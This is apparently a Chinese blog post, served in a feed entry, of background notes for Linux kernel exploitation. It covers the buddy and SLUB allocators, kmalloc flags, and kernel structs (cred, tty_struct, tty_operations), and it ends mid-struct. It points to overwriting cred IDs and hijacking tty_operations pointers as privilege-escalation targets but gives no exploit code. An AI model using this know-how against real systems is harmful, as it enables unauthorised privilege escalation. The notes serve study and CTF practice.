      <category term="二进制漏洞" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="二进制漏洞" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel pwn 基础整理</title>
    <link href="https://github.com/Cracke-S-J/2020/04/06/Linuxkernelpwn%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/Cracke-S-J/2020/04/06/Linuxkernelpwn%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86/</id>
    <published>2020-04-06T06:23:27.000Z</published>
    <updated>2020-05-23T14:15:56.806Z</updated>
    
    <content type="html"><![CDATA[<p>致谢参考：</p><ol><li><a href="https://www.anquanke.com/post/id/201454" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201454</a></li><li><a href="https://paper.seebug.org/1153/" target="_blank" rel="noopener">https://paper.seebug.org/1153/</a></li><li><a href="https://ctf-wiki.github.io/" target="_blank" rel="noopener">https://ctf-wiki.github.io/</a></li></ol><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux 内核和一些问题还是跟用户态有很大不同的，而且经常突然就用到了一些奇奇怪怪不知道什么意思的结构体，所以需要简单梳理一下一些基础的知识。</p><h2 id="Linux-内核内存管理"><a href="#Linux-内核内存管理" class="headerlink" title="Linux 内核内存管理"></a>Linux 内核内存管理</h2><h3 id="Buddy-System-伙伴系统"><a href="#Buddy-System-伙伴系统" class="headerlink" title="Buddy System(伙伴系统)"></a>Buddy System(伙伴系统)</h3><p>伙伴系统是一种简单粗暴的内存分配方式，一般是将大块内存简单地拆分，直到到达最小块；最简单地拆分是以2为指数进行拆分，比如定义最小块为 64K，order 为 4，那么最大块为<code>64K * 2 ^ 4 = 1024K</code>。</p><p>Linux内核中较大内存都通过伙伴系统实现，还有jemalloc也使用伙伴系统。</p><p>康一下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Free memory management - zoned buddy allocator.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_FORCE_MAX_ZONEORDER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER CONFIG_FORCE_MAX_ZONEORDER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER_NR_PAGES (1 &lt;&lt; (MAX_ORDER - 1))</span></span><br></pre></td></tr></table></figure><p>块的大小为一页，通常是4096字节，order为10。</p><h3 id="Slab-分配器"><a href="#Slab-分配器" class="headerlink" title="Slab 分配器"></a>Slab 分配器</h3><p>由于上面分配方法产生很多内存碎片，所以Linux内核引入Slab分配器，目前默认使用的兼容Slab接口的具体分配器是Slub。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>（开始粘代码）。</p><h4 id="kmem-cache"><a href="#kmem-cache" class="headerlink" title="kmem_cache"></a>kmem_cache</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Slab cache management.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">      <span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">      <span class="keyword">int</span> size;       <span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">      <span class="keyword">int</span> object_size;    <span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">      <span class="keyword">int</span> offset;     <span class="comment">/* Free pointer offset. */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">      <span class="keyword">int</span> cpu_partial;    <span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ...</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cpu_slab是个__percpu对象，就是为每个cpu保存的一个变量，减去加锁开销；node数据中存其它cpu的Slab，<a href="http://lse.sourceforge.net/numa/faq/index.html#what_is_a_node" target="_blank" rel="noopener">what’s node</a>。</p><h4 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a>kmem_cache_cpu</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> **freelist;    <span class="comment">/* Pointer to next available object */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tid;  <span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>  <span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>   <span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freelist指向第一个空闲的对象；page指向第一个空闲的对象所在slab的第一页；partial主要包含本地部分分配的slab；其中第一个page的pbojects记录了partial objects数。</p><h4 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a>kmem_cache_node</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line">    ..</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>partial是Linux内核中可插拔式通用双链表结构，使用内核中双链表的接口进行操作；nr_partial表示partial双链表中的元素个数，即slab的个数。</p><p>partial-&gt;next指向的page结构，用于该结构的page有如下特点：</p><ul><li>frozon = 0</li><li>freelist指向slab中第一个空闲object</li><li>inuse表示对应slab使用中的object个数</li><li><strong>通过lru字段索引链表中的下一个/前一个page</strong></li></ul><p>这里的链表是通过lru索引的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Third double word block</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* WARNING: bit 0 of the first word encode PageTail(). That means</span></span><br><span class="line"><span class="comment">* the rest users of the storage space MUST NOT use the bit to</span></span><br><span class="line"><span class="comment">* avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>   <span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">                * protected by zone_lru_lock !</span></span><br><span class="line"><span class="comment">                * Can be used as a generic list</span></span><br><span class="line"><span class="comment">                * by the page owner.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="分配和释放"><a href="#分配和释放" class="headerlink" title="分配和释放"></a>分配和释放</h3><h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><p>超过N页的对象使用伙伴系统分配，其它的流程如下。</p><ol><li>kmem_cache_cpu-&gt;freelist不为空，直接出链返回；</li><li>kmem_cache_cpu-&gt;page-&gt;freelist不为空，则出链，更新cpu_slab-&gt;freelist，然后返回；</li><li>kmem_cache_cpu-&gt;partial不为空，取出第一个slab，更新cpu_slab的freelist和page，取出对象然后返回；</li><li>kmem_cache_node-&gt;partial不为空，取出第一个，类似3更新cpu_slab的freelist和page并返回；</li><li>上面都是空的，则通过伙伴系统分配新的slab，挂到kmem_cache_cpu中，然后goto 1。</li></ol><h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><p>对象的释放相对复杂（但是个人感觉比libc还差点），和释放之前对象所处的位置以及释放后cache情况有关。假设待释放的object地址为p1，p1对应的page为p2，p1对应的slab为p3，参考上面的几个指针定义，大致有以下路径：</p><ol><li>p3就是当前CPU的kmem_cache_cpu-&gt;freelist所对应的slab，即p1位于当前cpu的kmem_cache_cpu-&gt;freelist所在的page中(p2 == cpu_slab-&gt;page)，此时可以直接释放到freelist上并返回；</li><li>p3位于当前CPU的kmem_cache_cpu-&gt;partial链表中，或者其他CPU的kmem_cache_cpu-&gt;freelist/partial中。此slab处于冻结状态，将p1链入p3-&gt;freelist中；</li><li>p3位于kmem_cache_node-&gt;partial链表中，此时释放分为两种情况：<ol><li>释放p1后，p3的状态为半满。此时正常将p1链入p3的freelist中。</li><li>释放p1后，p3的状态为全空。此时除了将p1链入p3的freelist以外，还需要判断node中slab数是否超过规定值(node-&gt;nr_partial &gt;= min_partial)。如果超过则需要将p3移出node-&gt;partial链表，并将p3释放给伙伴系统。</li></ol></li><li>p3是一个全满的slab，不被任何kmem_cache管理。释放后p3变成一个半满的slab(更新freelist)，同时p3会被加入到当前CPU的kmem_cache_cpu.partial中。加入之前需要判断cpu partial中的空闲对象是否超过了规定值(partial.pobjects &gt; cachep.cpu_partial)，并进行相应的处理：<ol><li>如果没超过，直接链入cpu partial即可；</li><li>如果超过，则将cpu partial中所有slab解冻，将其中所有半满的slab交由node进行管理；将其中所有空的slab回收给伙伴系统；最后再将slab链入到partial中。</li></ol></li></ol><h3 id="kmalloc-相关"><a href="#kmalloc-相关" class="headerlink" title="kmalloc 相关"></a>kmalloc 相关</h3><p>kmalloc函数用于在内核中分配Chunk，它有两个参数，第一个参数是Size，第二个参数称为flag，通过其以几个方式控制kmalloc的行为。</p><p>由于kmalloc函数可以最终通过调用 __get_free_pages 来进行，因此，这些flag通常带有 GFP_ 前缀。</p><p>最通常使用的标志是GFP_KERNEL, 这意味着此次分配是由运行在内核空间的进程进行的。换言之, 这意味着调用函数的是一个进程在尝试执行一个系统调用。</p><p>使用 GFP_KENRL 将意味着kmalloc能够使当前进程在内存不足的情况下执行睡眠操作来等待一页. 一个使用GFP_KERNEL 来分配内存的函数必须是可重入的并且不能在原子上下文中运行. 若当前进程睡眠, 内核将采取正确的动作来定位一些空闲内存, 或者通过刷新缓存到磁盘或者交换出去一个用户进程的内存。</p><p>GFP_KERNEL不一定是正确分配标志; 有时kmalloc从一个进程的上下文的外部进行调用。这类的调用可能发生在中断处理, tasklet, 和内核定时器中. 在这个情况下, 当前进程不应当被置为睡眠, 并且驱动应当使用一个 GFP_ATOMIC标志来代替GFP_KERNEL。此时，内核将正常地试图保持一些空闲页以便来满足原子分配。</p><p>当使用GFP_ATOMIC时，kmalloc甚至能够使用最后一个空闲页。如果最后一个空闲页也不存在将会导致分配失败。</p><p>除此之外，还有如下的标志可供我们选择(更完整的标志列表请查阅linux/gfp.h)：</p><ul><li>GFP_USER – 由用户态的程序来分配内存，可以使用睡眠等待机制。</li><li>GFP_HIGHUSER – 从高地址分配内存。</li><li>GFP_NOIO – 分配内存时禁止使用任何I/O操作。</li><li>GFP_NOFS – 分配内存时禁止调用fs寄存器。</li><li>GFP_NOWAIT – 立即分配，不做等待。</li><li>__GFP_THISNODE – 仅从本地节点分配内存。</li><li>GFP_DMA – 进行适用于DMA的分配，这应该仅应用于kmalloc缓存，否则请使用SLAB_DMA创建的slab。</li></ul><h2 id="内核相关-struct"><a href="#内核相关-struct" class="headerlink" title="内核相关 struct"></a>内核相关 struct</h2><h3 id="cred-struct"><a href="#cred-struct" class="headerlink" title="cred struct"></a>cred struct</h3><p>内核通过这个结构体管理进程，每个进程对应一个 cred，如果能修改uid/gid，就能控制进程权限了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty struct"></a>tty struct</h3><p>讲真我在到处都能看到tty，但是一直不知道它是什么鸟东西。</p><p><a href="https://blog.csdn.net/Charein/article/details/35243009" target="_blank" rel="noopener">对于Linux内核tty设备的一点理解</a></p><p><a href="https://blog.csdn.net/findaway123/article/details/53122031" target="_blank" rel="noopener">Linux下tty/pty/pts/ptmx详解</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>   <span class="comment">// 重点关注这个</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>        <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 下面开始，pwn 手天堂*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  